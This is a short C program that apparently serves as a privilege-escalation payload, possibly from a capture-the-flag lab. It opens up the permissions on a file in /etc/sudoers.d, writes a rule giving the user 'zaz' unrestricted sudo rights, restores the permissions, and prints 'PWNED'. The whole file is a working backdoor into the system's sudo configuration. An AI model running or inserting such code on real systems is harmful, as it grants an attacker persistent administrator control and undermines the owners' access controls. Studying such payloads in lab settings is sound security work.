#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

#define PATH			"/etc/sudoers.d/README"
#define CONTENT			"zaz ALL=(ALL:ALL) ALL\n"

# define ONE			1
# define LENGTH			22
# define MODE			0777
# define DEFAULT_MODE	0440

void main(void)
{
	chmod(PATH, MODE);
	write(open(PATH, ONE), CONTENT, LENGTH);
	chmod(PATH, DEFAULT_MODE);
	printf("\033c\033[5;1;31mPWNED\n");
	exit(1);
}
